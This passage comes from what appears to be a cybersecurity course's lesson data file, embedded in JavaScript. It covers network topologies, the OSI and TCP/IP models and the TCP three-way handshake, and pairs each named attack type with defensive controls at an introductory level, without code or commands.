              </section>

              <section class="content-block">
                <h3 class="content-h">3. Topology Reference</h3>

                <figure class="content-figure">
                  <img src="./img/network-topologies.png" alt="Six network topologies: Bus, Star, Ring, Mesh, Tree, and Hybrid with cost and security ratings" />
                  <figcaption>Figure 3.1 — Six fundamental network topologies. Each has distinct trade-offs in cost, fault tolerance, scalability, and security risk.</figcaption>
                </figure>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Topologies in Depth</h3>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🚌</span>
                    <h4>Bus Topology</h4>
                  </div>
                  <p><strong>Definition:</strong> All devices connect to a single central cable (the bus or backbone). Data travels in both directions along the bus.</p>
                  <p><strong>Characteristics:</strong> Single point of failure if the bus breaks; terminators required at both ends; limited cable length; low cost; performance degrades with device count due to collisions.</p>
                  <p><strong>Historical use:</strong> Early Ethernet (10BASE5, 10BASE2). Largely obsolete today.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Eavesdropping — any device can capture all traffic</li>
                        <li>Denial of Service — cutting the bus disables the whole network</li>
                        <li>MAC flooding on the shared medium</li>
                        <li>Signal injection of malicious frames</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Encryption (IPsec) on all traffic</li>
                        <li>Replace hubs with switches</li>
                        <li>Physical security of cabling</li>
                        <li>Traffic pattern monitoring</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">⭐</span>
                    <h4>Star Topology</h4>
                  </div>
                  <p><strong>Definition:</strong> All devices connect to a central device (switch, hub, or router). Data passes through the central device to reach its destination.</p>
                  <p><strong>Characteristics:</strong> Most common in modern LANs. Central device is a single point of failure unless redundant. Easy to add or remove devices. Each device has a dedicated link to the center. Predictable performance with no collisions in a switched star.</p>
                  <p><strong>Real-world use:</strong> Home Wi-Fi networks, office networks with central switches.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Central device compromise — all traffic intercepted</li>
                        <li>ARP spoofing from one port</li>
                        <li>MAC flooding — switch table overflow → acts as hub</li>
                        <li>Rogue access point connected to the switch</li>
                        <li>VLAN hopping to escape segmentation</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Strong passwords and firmware updates on central device</li>
                        <li>Port Security</li>
                        <li>DHCP Snooping &amp; Dynamic ARP Inspection</li>
                        <li>802.1X authentication</li>
                        <li>VLAN segmentation</li>
                        <li>IDS/IPS monitoring</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🔄</span>
                    <h4>Ring Topology</h4>
                  </div>
                  <p><strong>Definition:</strong> Devices are connected in a closed loop. Data travels in one direction (unidirectional) or both directions (bidirectional) around the ring. Each device acts as a repeater.</p>
                  <p><strong>Characteristics:</strong> Token Ring and FDDI are examples. Data passes through each device until it reaches its destination. A break can disrupt the network unless a dual ring is used. Deterministic performance.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Eavesdropping — data passes through every node</li>
                        <li>Denial of Service — breaking the ring stops communication</li>
                        <li>Token manipulation in Token Ring</li>
                        <li>Insertion of a malicious node</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Dual ring for redundancy</li>
                        <li>Encrypt traffic</li>
                        <li>Monitor unusual token behaviour</li>
                        <li>Physical security of cabling</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🕸️</span>
                    <h4>Mesh Topology</h4>
                  </div>
                  <p><strong>Definition:</strong> Every device connects to every other device — fully (full mesh) or partially (partial mesh). Provides redundant paths.</p>
                  <p><strong>Characteristics:</strong> Full mesh has n(n−1)/2 links. High redundancy and fault tolerance. Expensive and complex. Common in WAN backbones and data centers.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Routing protocol manipulation</li>
                        <li>Link flooding to force traffic through one path</li>
                        <li>Physical taps on multiple links</li>
                        <li>Compromised node can attack many peers</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Secure routing protocols (BGPsec, OSPF auth)</li>
                        <li>Encrypt all links</li>
                        <li>Monitor all paths</li>
                        <li>Redundancy and diversity</li>
                        <li>Zero Trust segmentation</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🌳</span>
                    <h4>Tree (Hierarchical) Topology</h4>
                  </div>
                  <p><strong>Definition:</strong> A hierarchical topology combining star and bus. Multiple star networks connect to a backbone bus.</p>
                  <p><strong>Characteristics:</strong> Used in large networks (campus, enterprise). Root node, intermediate nodes, leaf nodes. Scalable but depends on root. Common in modern Ethernet networks (core, distribution, access layers).</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Root compromise — core switch/router takeover</li>
                        <li>Spanning Tree attacks — becoming root bridge</li>
                        <li>VLAN hopping</li>
                        <li>Lateral movement from access to core</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Secure core devices</li>
                        <li>BPDU Guard and Root Guard</li>
                        <li>VLAN segmentation</li>
                        <li>802.1X port authentication</li>
                        <li>Monitoring</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🧬</span>
                    <h4>Hybrid Topology</h4>
                  </div>
                  <p><strong>Definition:</strong> A combination of two or more topologies. Most real-world networks are hybrid.</p>
                  <p><strong>Characteristics:</strong> Flexible, scalable, complex. Used in large enterprises and data centers. Example: star in each department connected via a mesh backbone.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Larger attack surface</li>
                        <li>Weakest link determines overall security</li>
                        <li>Complexity hides misconfigurations</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Layered security</li>
                        <li>Segmentation</li>
                        <li>Regular audits</li>
                        <li>Defense in depth</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Comparison at a Glance</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Topology</span><span>Cost</span><span>Fault Tolerance / Security</span>
                  </div>
                  <div class="tool-row"><span>Bus</span><span>Low</span><span>Low / High risk</span></div>
                  <div class="tool-row"><span>Star</span><span>Medium</span><span>Medium / Medium risk</span></div>
                  <div class="tool-row"><span>Ring</span><span>Medium</span><span>Low / Medium risk</span></div>
                  <div class="tool-row"><span>Mesh</span><span>High</span><span>High / Medium risk</span></div>
                  <div class="tool-row"><span>Tree</span><span>Medium-High</span><span>Medium / Medium risk</span></div>
                  <div class="tool-row"><span>Hybrid</span><span>High</span><span>High / High risk</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Topology defines how devices are arranged and how data flows.</li>
                  <li>Physical and logical topologies may differ.</li>
                  <li>Star is the most common in modern LANs; mesh provides redundancy at high cost.</li>
                  <li>Tree is hierarchical for enterprise; hybrid combines multiple designs.</li>
                  <li>Attackers exploit shared media, single points of failure, and trust relationships.</li>
                  <li>Defenders use segmentation, hardening, encryption, monitoring, and redundancy.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Packet Analysis</a>
                  <a href="https://nmap.org/" target="_blank" rel="noopener">Nmap — Network Scanning</a>
                  <a href="https://www.gns3.com/" target="_blank" rel="noopener">GNS3 — Network Emulation</a>
                  <a href="https://www.netacad.com/courses/packet-tracer" target="_blank" rel="noopener">Cisco Packet Tracer</a>
                  <a href="https://www.librenms.org/" target="_blank" rel="noopener">LibreNMS — Network Monitoring</a>
                </div>
              </section>
            ` },
                    { id: "1.4", title: "The OSI Model & TCP/IP Stack", pages: "59-72", read: 18,
            build: "Map seven attack types to their OSI layer and a matching defense.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>The <strong>OSI Model</strong> (Open Systems Interconnection) is a conceptual framework developed by ISO in 1984. It standardizes network communication by dividing it into seven layers, each with specific functions.</p>
                <p>The <strong>TCP/IP Model</strong> is the practical four-layer framework used by the modern Internet. It maps closely to the OSI model and is the foundation of all Internet communication. Together they provide a common language for network engineers, developers, and security professionals — helping design networks, troubleshoot layer by layer, and understand where attacks occur.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy — Sending a Letter</h3>
                <ul class="content-list">
                  <li>You write the letter — <strong>Application Layer</strong> (human-readable data).</li>
                  <li>You put it in an envelope — <strong>Presentation Layer</strong> (encoding, encryption).</li>
                  <li>You start a conversation — <strong>Session Layer</strong> (start, maintain, end).</li>
                  <li>You write the address — <strong>Transport Layer</strong> (reliable delivery).</li>
                  <li>Postal service plans the route — <strong>Network Layer</strong> (routing, IP addressing).</li>
                  <li>Local office hands to delivery van — <strong>Data Link Layer</strong> (MAC addressing, framing).</li>
                  <li>Van drives on roads — <strong>Physical Layer</strong> (cables, signals).</li>
                </ul>
                <p>Each layer has a specific job. If one layer fails, communication fails.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. The OSI Model — Seven Layers</h3>

                <figure class="content-figure">
                  <img src="./img/osi-tcpip-model.png" alt="OSI Model (7 layers) mapped to the TCP/IP Model (4 layers)" />
                  <figcaption>Figure 4.1 — The OSI Model mapped to the TCP/IP Model. Encapsulation adds headers as data moves down; de-encapsulation reverses the process at the destination.</figcaption>
                </figure>

                <p class="sub-h">Mnemonic (Top to Bottom)</p>
                <p><em>"All People Seem To Need Data Processing"</em> — Application, Presentation, Session, Transport, Network, Data Link, Physical.</p>

                <p class="sub-h">Mnemonic (Bottom to Top)</p>
                <p><em>"Please Do Not Throw Sausage Pizza Away"</em> — Physical, Data Link, Network, Transport, Session, Presentation, Application.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. The Seven Layers in Depth</h3>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">1️⃣</span>
                    <h4>Layer 1 — Physical</h4>
                  </div>
                  <p><strong>Definition:</strong> Transmits raw bit streams over a physical medium. Defines electrical, mechanical, and procedural specifications.</p>
                  <p><strong>Functions:</strong> Bit transmission, encoding/signaling, data rate control, physical topology, transmission mode.</p>
                  <p><strong>Examples:</strong> Ethernet cables, fiber optics, coaxial cable, wireless radio, hubs, repeaters, NICs.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Physical tapping of cables</li>
                        <li>Electromagnetic interference (EMI) jamming</li>
                        <li>Signal injection</li>
                        <li>Hardware implants</li>
                        <li>USB drop attacks</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Locked server rooms, cable conduits, CCTV</li>
                        <li>Shielded cables and fiber optics</li>
                        <li>Port security on unused ports</li>
                        <li>Tamper-evident seals</li>
                        <li>Encryption at higher layers</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">2️⃣</span>
                    <h4>Layer 2 — Data Link</h4>
                  </div>
                  <p><strong>Definition:</strong> Reliable node-to-node delivery of frames within a local network. Handles MAC addressing, error detection, and flow control.</p>
                  <p><strong>Sub-layers:</strong> LLC (Logical Link Control) and MAC (Media Access Control).</p>
                  <p><strong>Examples:</strong> Ethernet (802.3), Wi-Fi (802.11), PPP, switches, bridges, ARP.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>MAC spoofing</li>
                        <li>MAC flooding (CAM table overflow)</li>
                        <li>ARP spoofing</li>
                        <li>VLAN hopping (double tagging, switch spoofing)</li>
                        <li>Spanning Tree attacks (root bridge takeover)</li>
                        <li>Rogue DHCP / DHCP starvation</li>
                        <li>Wi-Fi deauthentication</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Port Security (limit MACs per port)</li>
                        <li>DHCP Snooping</li>
                        <li>Dynamic ARP Inspection (DAI)</li>
                        <li>BPDU Guard / Root Guard</li>
                        <li>802.1X port-based authentication</li>
                        <li>VLAN segmentation</li>
                        <li>WPA3 wireless encryption</li>
                        <li>MACsec Layer 2 encryption</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">3️⃣</span>
                    <h4>Layer 3 — Network</h4>
                  </div>
                  <p><strong>Definition:</strong> Logical addressing and routing of packets across multiple networks. Determines the best path from source to destination.</p>
                  <p><strong>Examples:</strong> IPv4, IPv6, ICMP, IGMP, routing protocols (OSPF, BGP, RIP, EIGRP), routers, Layer 3 switches, NAT.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>IP spoofing</li>
                        <li>ICMP attacks (ping flood, Smurf, ICMP redirect)</li>
                        <li>Routing attacks (BGP hijacking, OSPF manipulation)</li>
                        <li>Fragmentation attacks (Teardrop, Ping of Death)</li>
                        <li>Traceroute reconnaissance</li>
                        <li>DDoS</li>
                        <li>MITM at Layer 3</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Ingress/Egress filtering</li>
                        <li>RPKI and BGPsec</li>
                        <li>OSPF authentication</li>
                        <li>ICMP rate limiting</li>
                        <li>Firewalls (IP, port, protocol)</li>
                        <li>IPsec encryption</li>
                        <li>Network segmentation</li>
                        <li>NetFlow, sFlow, BGP monitoring</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">4️⃣</span>
                    <h4>Layer 4 — Transport</h4>
                  </div>
                  <p><strong>Definition:</strong> End-to-end communication, data segmentation, flow control, and error recovery.</p>
                  <p><strong>Examples:</strong> TCP, UDP, SCTP, DCCP. Ports (0–65535). TCP 3-way handshake (SYN, SYN-ACK, ACK).</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>SYN flood</li>
                        <li>TCP Reset attack</li>
                        <li>Session hijacking</li>
                        <li>Port scanning</li>
                        <li>UDP flood</li>
                        <li>TCP session prediction</li>
                        <li>Amplification attacks</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>SYN cookies</li>
                        <li>Rate limiting</li>
                        <li>Stateful firewalls</li>
                        <li>IDS/IPS</li>
                        <li>TLS/SSL for TCP sessions</li>
                        <li>Port knocking</li>
                        <li>NetFlow, connection logs</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">5️⃣</span>
                    <h4>Layer 5 — Session</h4>
                  </div>
                  <p><strong>Definition:</strong> Establishes, manages, and terminates sessions between applications. Handles dialogue control and synchronization.</p>
                  <p><strong>Examples:</strong> RPC, NetBIOS, PPTP, SMB (partially), SOCKS.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Session hijacking (cookie/token theft)</li>
                        <li>Session fixation</li>
                        <li>Session ID prediction</li>
                        <li>CSRF</li>
                        <li>Session replay</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Secure, long, random session IDs</li>
                        <li>Session timeout</li>
                        <li>HttpOnly, Secure, SameSite cookies</li>
                        <li>Regenerate session ID after login</li>
                        <li>CSRF tokens</li>
                        <li>TLS encryption</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">6️⃣</span>
                    <h4>Layer 6 — Presentation</h4>
                  </div>
                  <p><strong>Definition:</strong> Translates data between the application layer and the network format. Handles encoding, encryption, compression, and formatting.</p>
                  <p><strong>Examples:</strong> SSL/TLS, JPEG, GIF, PNG, MPEG, ASCII, Unicode, MIME, XDR.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>SSL/TLS attacks — BEAST, POODLE, Heartbleed</li>
                        <li>Downgrade attacks</li>
                        <li>Encoding bypass</li>
                        <li>Compression attacks — CRIME, BREACH</li>
                        <li>Malicious PDF/image/document files</li>
                        <li>Weak ciphers</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>TLS 1.2 or 1.3 — disable old versions</li>
                        <li>Strong ciphers (AES-GCM, ChaCha20)</li>
                        <li>Certificate pinning</li>
                        <li>HSTS</li>
                        <li>Input validation on encoded data</li>
                        <li>Disable compression for sensitive data</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">7️⃣</span>
                    <h4>Layer 7 — Application</h4>
                  </div>
                  <p><strong>Definition:</strong> Provides network services directly to end-user applications. Where users interact with the network.</p>
                  <p><strong>Examples:</strong> HTTP, HTTPS, FTP, SFTP, SMTP, POP3, IMAP, DNS, DHCP, Telnet, SSH, SNMP, SMB, NFS.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>SQL Injection</li>
                        <li>Cross-Site Scripting (XSS)</li>
                        <li>CSRF</li>
                        <li>Command Injection</li>
                        <li>File Inclusion (LFI/RFI)</li>
                        <li>Phishing</li>
                        <li>DNS attacks (spoofing, tunneling, poisoning)</li>
                        <li>API attacks</li>
                        <li>Zero-day exploits</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Input validation</li>
                        <li>Output encoding (anti-XSS)</li>
                        <li>Parameterized queries (anti-SQLi)</li>
                        <li>CSRF tokens</li>
                        <li>Web Application Firewall (WAF)</li>
                        <li>OWASP Top 10 secure coding</li>
                        <li>MFA</li>
                        <li>Rate limiting</li>
                        <li>Security headers (CSP, HSTS, X-Frame-Options)</li>
                        <li>Regular patching</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. The TCP/IP Model — Four Layers</h3>
                <p>The TCP/IP model is the practical implementation used on the Internet.</p>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>TCP/IP Layer</span><span>Maps to OSI</span><span>Examples</span>
                  </div>
                  <div class="tool-row"><span>Network Access</span><span>Physical + Data Link</span><span>Ethernet, Wi-Fi, ARP</span></div>
                  <div class="tool-row"><span>Internet</span><span>Network</span><span>IP, ICMP, BGP, OSPF</span></div>
                  <div class="tool-row"><span>Transport</span><span>Transport</span><span>TCP, UDP</span></div>
                  <div class="tool-row"><span>Application</span><span>Session + Presentation + Application</span><span>HTTP, DNS, SMTP, SSH</span></div>
                </div>
                <p><strong>Key differences:</strong> OSI is theoretical (7 layers); TCP/IP is practical (4 layers). TCP/IP is protocol-driven; OSI is model-driven.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Encapsulation &amp; De-encapsulation</h3>
                <p><strong>Encapsulation</strong> adds headers (and sometimes trailers) as data moves down the layers:</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">L7</span> Data (e.g., HTTP request)</div>
                  <div class="step-item"><span class="step-num">L4</span> TCP header + Data = <strong>Segment</strong></div>
                  <div class="step-item"><span class="step-num">L3</span> IP header + Segment = <strong>Packet</strong></div>
                  <div class="step-item"><span class="step-num">L2</span> Frame header + Packet + Frame trailer = <strong>Frame</strong></div>
                  <div class="step-item"><span class="step-num">L1</span> Bits transmitted</div>
                </div>
                <p><strong>De-encapsulation</strong> reverses this at the receiving end.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>The OSI model has 7 layers; TCP/IP has 4 layers.</li>
                  <li>Each layer has specific functions and protocols.</li>
                  <li>Encapsulation adds headers down; de-encapsulation removes them up.</li>
                  <li>Attacks occur at every layer — defenses must too.</li>
                  <li>Layer 2 attacks (ARP, MAC) are common in LANs; Layer 3 (IP, BGP) affect routing; Layer 4 (SYN, ports) target connections; Layer 7 (SQLi, XSS) target applications.</li>
                  <li>Defense in depth is essential — every layer needs its own controls.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Packet Analysis</a>
                  <a href="https://nmap.org/" target="_blank" rel="noopener">Nmap — Network Scanning</a>
                  <a href="https://scapy.net/" target="_blank" rel="noopener">Scapy — Packet Crafting</a>
                  <a href="https://www.professormesser.com/network-plus/n10-008/n10-008-training-course/" target="_blank" rel="noopener">Professor Messer — Network+ Training</a>
                  <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener">OWASP Cheat Sheets</a>
                </div>
              </section>
            ` },
                    { id: "1.5", title: "Data Packets & The TCP 3-Way Handshake", pages: "73-82", read: 16,
            build: "Capture and analyze a 3-way handshake in Wireshark.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>A <strong>data packet</strong> is a small unit of data formatted for transmission over a network. It consists of a <strong>header</strong> (control information such as source and destination addresses, sequence numbers, and protocol details) and a <strong>payload</strong> (the actual data). Packets allow data to be broken into manageable chunks, routed independently, and reassembled at the destination.</p>
                <p>The <strong>3-Way Handshake</strong> is the process TCP uses to establish a reliable connection before data transfer begins. It ensures both parties are ready, synchronized, and agree to communicate.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>Imagine making a phone call to a friend:</p>
                <ul class="content-list">
                  <li>You dial and wait — <strong>SYN</strong> ("Are you there?")</li>
                  <li>Your friend picks up: "Hello, I am here. Who is this?" — <strong>SYN-ACK</strong></li>
                  <li>You say: "It's me, let's talk." — <strong>ACK</strong></li>
                </ul>
                <p>Now the conversation begins. This is exactly how TCP establishes a connection before sending data. If the friend does not pick up, the call fails — just as TCP fails if the SYN-ACK never arrives.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Anatomy of a Packet</h3>
                <p>At the Network Layer, an <strong>IP packet</strong> contains these fields:</p>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Field</span><span>Purpose</span><span>Notes</span>
                  </div>
                  <div class="tool-row"><span>Version</span><span>IPv4 or IPv6</span><span>4-bit</span></div>
                  <div class="tool-row"><span>Header Length</span><span>Size of header</span><span>IHL</span></div>
                  <div class="tool-row"><span>Type of Service</span><span>Priority / QoS</span><span>DSCP / ECN</span></div>
                  <div class="tool-row"><span>Total Length</span><span>Entire packet size</span><span>Header + payload</span></div>
                  <div class="tool-row"><span>Identification</span><span>Fragment tracking</span><span>Unique per packet</span></div>
                  <div class="tool-row"><span>Flags</span><span>Fragmentation control</span><span>DF, MF</span></div>
                  <div class="tool-row"><span>Fragment Offset</span><span>Position in original</span><span>13-bit</span></div>
                  <div class="tool-row"><span>Time to Live</span><span>Max hops before discard</span><span>TTL</span></div>
                  <div class="tool-row"><span>Protocol</span><span>TCP, UDP, ICMP</span><span>8-bit</span></div>
                  <div class="tool-row"><span>Header Checksum</span><span>Error detection</span><span>Header only</span></div>
                  <div class="tool-row"><span>Source IP</span><span>Sender</span><span>32-bit</span></div>
                  <div class="tool-row"><span>Destination IP</span><span>Receiver</span><span>32-bit</span></div>
                  <div class="tool-row"><span>Payload</span><span>Actual data</span><span>Variable</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Why Packets?</h3>
                <ul class="content-list">
                  <li>Large data would block the network</li>
                  <li>Packets can take different paths independently</li>
                  <li>If one packet is lost, only that packet is retransmitted</li>
                  <li>Multiple users share the network efficiently</li>
                </ul>
                <p><strong>Packet lifecycle:</strong> Creation → Encapsulation → Transmission → Routing → Reassembly → Delivery.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. The 3-Way Handshake</h3>

                <figure class="content-figure">
                  <img src="./img/tcp-handshake.png" alt="TCP 3-Way Handshake — SYN, SYN-ACK, ACK sequence between client and server" />
                  <figcaption>Figure 5.1 — The TCP 3-Way Handshake. Client sends SYN, server replies SYN-ACK, client acknowledges with ACK. Connection established.</figcaption>
                </figure>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">①</span>
                    <h4>Step 1 — SYN</h4>
                  </div>
                  <p>The client sends a TCP segment with the <strong>SYN flag</strong> set.</p>
                  <ul class="content-list">
                    <li>Source Port: random high port (e.g., 54321)</li>
                    <li>Destination Port: service port (e.g., 80 for HTTP)</li>
                    <li>Sequence Number: random initial sequence number (ISN)</li>
                    <li>Flags: <code>SYN = 1</code></li>
                  </ul>
                  <p><em>"I want to connect. My sequence number is X."</em></p>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">②</span>
                    <h4>Step 2 — SYN-ACK</h4>
                  </div>
                  <p>The server responds with a segment carrying <strong>both SYN and ACK flags</strong>.</p>
                  <ul class="content-list">
                    <li>Source Port: service port</li>
                    <li>Destination Port: client's port</li>
                    <li>Sequence Number: server's own ISN</li>
                    <li>Acknowledgment: client's ISN + 1</li>
                    <li>Flags: <code>SYN = 1</code>, <code>ACK = 1</code></li>
                  </ul>
                  <p><em>"I acknowledge your request. My sequence number is Y."</em></p>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">③</span>
                    <h4>Step 3 — ACK</h4>
                  </div>
                  <p>The client sends a final segment with the <strong>ACK flag</strong> set.</p>
                  <ul class="content-list">
                    <li>Sequence Number: client's ISN + 1</li>
                    <li>Acknowledgment: server's ISN + 1</li>
                    <li>Flags: <code>ACK = 1</code></li>
                  </ul>
                  <p><em>"I acknowledge your readiness. Connection established."</em></p>
                </div>

                <h4 class="sub-h">Connection Termination — 4-Way Handshake</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> FIN — Client wants to close</div>
                  <div class="step-item"><span class="step-num">2</span> ACK — Server acknowledges</div>
                  <div class="step-item"><span class="step-num">3</span> FIN — Server wants to close</div>
                  <div class="step-item"><span class="step-num">4</span> ACK — Client acknowledges</div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>SYN Flood</strong> — Many SYN packets with fake source IPs exhaust the connection table</li>
                      <li><strong>TCP Reset</strong> — Forged RST packets terminate active connections</li>
                      <li><strong>Session Hijacking</strong> — Predicting sequence numbers or stealing tokens</li>
                      <li><strong>Port Scanning</strong> — SYN packets reveal open ports via SYN-ACK vs RST</li>
                      <li><strong>Packet Sniffing</strong> — Capturing unencrypted payloads on public Wi-Fi</li>
                      <li><strong>Fragmentation Attacks</strong> — Teardrop, Ping of Death</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>SYN Cookies</strong> — Don't allocate until handshake completes</li>
                      <li><strong>Rate Limiting</strong> — Cap SYN packets per source</li>
                      <li><strong>Firewall Rules</strong> — Block suspicious sources</li>
                      <li><strong>Load Balancers</strong> — Distribute SYN traffic</li>
                      <li><strong>IDS/IPS</strong> — Detect flood patterns</li>
                      <li><strong>Encryption</strong> — TLS/HTTPS defeats sniffing</li>
                      <li><strong>Secure Cookies</strong> — HttpOnly, Secure, SameSite</li>
                      <li><strong>MFA</strong> — Adds a barrier to session theft</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>A packet is a unit of data with a header and payload.</li>
                  <li>Packets enable efficient, reliable, and scalable communication.</li>
                  <li>TCP uses a 3-Way Handshake: SYN, SYN-ACK, ACK.</li>
                  <li>The handshake ensures both sides are ready and synchronized.</li>
                  <li>TCP termination uses a 4-Way Handshake.</li>
                  <li>SYN flood, session hijacking, and sniffing are major attacks.</li>
                  <li>Defenses include SYN cookies, encryption, secure cookies, and monitoring.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Capture TCP handshake live</a>
                  <a href="https://scapy.net/" target="_blank" rel="noopener">Scapy — Craft packets in Python</a>
                  <a href="https://www.tcpdump.org/" target="_blank" rel="noopener">tcpdump — Command-line capture</a>
